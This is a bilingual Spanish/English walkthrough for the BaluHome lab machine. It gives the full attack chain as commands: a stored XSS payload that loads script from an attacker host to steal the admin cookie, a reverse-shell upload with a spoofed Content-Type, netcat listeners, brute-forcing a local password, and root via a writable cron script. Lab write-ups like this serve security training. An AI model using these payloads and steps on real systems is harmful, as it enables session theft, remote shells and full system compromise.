# BaluHome - QuickStart Guide / Guía de Inicio Rápido

Este documento proporciona una guía rápida y directa con los pasos y comandos críticos para resolver el laboratorio de ciberseguridad BaluHome.
This document provides a quick and direct guide containing the critical steps and commands to solve the BaluHome cybersecurity laboratory.

---

## Castellano / Spanish

### 1. Escaneo Inicial
Descubrimiento de servicios activos:
```bash
nmap -p- --open -sS -Pn -n -v [TARGET_IP]
```
*Servicio web disponible únicamente en el puerto `3000`.*

### 2. Acceso Inicial (Stored XSS)
1. Registrar un usuario de prueba (ej., `test:test`) en `http://[TARGET_IP]:3000`.
2. Identificar al usuario `admin` en la sección de mensajería.
3. Subir un video de prueba y agregar el siguiente payload XSS en la sección de subtítulos:
   ```html
   <script src="http://[ATTACKER_IP]/?c="></script>
   ```
4. Levantar un servidor HTTP de escucha en la máquina atacante (puerto 80):
   ```bash
   python3 -m http.server 80
   ```
5. Enviar el enlace del video al usuario `admin` usando la mensajería interna.
6. Copiar la cookie recibida en Base64 y decodificarla:
   ```bash
   echo "[BASE64_COOKIE]" | base64 -d
   ```
7. Reemplazar la cookie de sesión en el navegador para suplantar al administrador.

### 3. Explotación de la Subida de Archivos (RCE)
1. En el perfil de administrador, ir a la sección de miniaturas.
2. Subir un script de reverse shell en JavaScript (`shell.js`).
3. Intercepta la petición de subida con Burp Suite y cambiar la cabecera `Content-Type` de `application/javascript` a `image/jpg`.
4. Configurar un oyente en la máquina atacante:
   ```bash
   nc -lvnp 4444
   ```
5. Ejecutar/reproducir el video correspondiente a la miniatura subida para ejecutar el código y recibir la shell reversa (`www-data`).
6. Estabilizar la shell (TTY):
   ```bash
   script /dev/null -c bash
   # Presionar Ctrl+Z
   stty raw -echo; fg
   reset xterm
   export TERM=xterm
   ```

### 4. Movimiento Lateral (Fuerza Bruta)
1. Transferir el script `force.sh` (de <https://github.com/nohh022/bruteForce.git>) y el diccionario `rockyou.txt` a la máquina víctima:
   * Atacante: `nc [TARGET_IP] [PORT] < archivo`
   * Víctima: `nc -lvnp [PORT] > archivo`
2. Ejecutar el ataque de fuerza bruta sobre el usuario local `balutin`:
   ```bash
   chmod +x force.sh
   ./force.sh balutin rockyou.txt
   ```
3. Migrar al usuario `balutin` con la contraseña comprometida:
   ```bash
   su balutin
   ```

### 5. Escalada de Privilegios
1. Abusar del script `/opt/balutube-backup/backup.sh` (modificable por el grupo `mantenimiento` al que pertenece `balutin`) para otorgar permisos SUID a bash:
   ```bash
   echo "chmod u+s /bin/bash" >> /opt/balutube-backup/backup.sh
   ```
2. Esperar a la ejecución automática del script (cronjob).
3. Obtener acceso de root ejecutando:
   ```bash
   bash -p
   ```

---

## English

### 1. Initial Reconnaissance
Discover active services:
```bash
nmap -p- --open -sS -Pn -n -v [TARGET_IP]
```
*Web service identified only on port `3000`.*

### 2. Initial Access (Stored XSS)
1. Register a test user (e.g., `test:test`) on `http://[TARGET_IP]:3000`.
2. Locate the user `admin` via the internal messaging section.
3. Upload a mock video and add the following XSS payload in the subtitles field:
   ```html
   <script src="http://[ATTACKER_IP]/?c="></script>
   ```
4. Start an HTTP listener on the attacker machine (port 80):
   ```bash
   python3 -m http.server 80
   ```
5. Send the video link to the user `admin` through the internal messaging system.
6. Copy the exfiltrated Base64 cookie from the HTTP logs and decode it:
   ```bash
   echo "[BASE64_COOKIE]" | base64 -d
   ```
7. Replace the session cookie in your browser settings to impersonate the administrator.

### 3. File Upload Exploitation (RCE)
1. Navigate to the video thumbnail upload section in the administrator panel.
2. Upload a JavaScript reverse shell script (`shell.js`).
3. Intercept the upload request with Burp Suite and modify the `Content-Type` header from `application/javascript` to `image/jpg`.
4. Start a Netcat listener on the attacker machine:
   ```bash
   nc -lvnp 4444
   ```
5. Run/play the video corresponding to the uploaded thumbnail to trigger execution and catch the reverse shell (`www-data`).
6. Stabilize the shell (TTY upgrade):
   ```bash
   script /dev/null -c bash
   # Press Ctrl+Z
   stty raw -echo; fg
   reset xterm
   export TERM=xterm
   ```

### 4. Lateral Movement (Brute-Forcing)
1. Transfer the `force.sh` script (from <https://github.com/nohh022/bruteForce.git>) and the `rockyou.txt` wordlist to the target machine:
   * Attacker: `nc [TARGET_IP] [PORT] < file`
   * Target: `nc -lvnp [PORT] > file`
2. Run the brute-force script against local user `balutin`:
   ```bash
   chmod +x force.sh
   ./force.sh balutin rockyou.txt
   ```
3. Log in as user `balutin` using the cracked credentials:
   ```bash
   su balutin
   ```

### 5. Privilege Escalation
1. Abuse the writable `/opt/balutube-backup/backup.sh` script (writable by the `mantenimiento` group) to set the SUID bit on the bash binary:
   ```bash
   echo "chmod u+s /bin/bash" >> /opt/balutube-backup/backup.sh
   ```
2. Wait for the automated task (cron job) to execute the script.
3. Spawn a privileged shell to obtain root access:
   ```bash
   bash -p
   ```
